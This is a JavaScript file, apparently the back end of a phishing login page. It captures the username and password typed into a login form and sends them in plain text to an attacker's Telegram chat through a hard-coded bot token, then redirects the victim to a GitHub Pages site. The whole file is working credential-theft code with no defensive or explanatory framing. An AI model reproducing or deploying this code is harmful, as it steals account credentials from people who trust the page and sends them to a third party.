const BOT_TOKEN = '7072605905:AAHx_bSV9Y8JewJxSXy2me8nLeDWdQE3gqM';
const CHAT_ID = '7122235679';

async function sendCredentials(username, password) {
  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `Username: ${username}\nPassword: ${password}`,
    }),
  });

  if (response.ok) {
    window.location.href = 'https://mahir966.github.io/mahir.github.io/';
  } else {
    console.error('Failed to login');
  }
}

document.querySelector('.login-form').addEventListener('submit', async (event) => {
  event.preventDefault();

  const username = document.querySelector('input[type="text"]').value;
  const password = document.querySelector('input[type="password"]').value;

  await sendCredentials(username, password);
});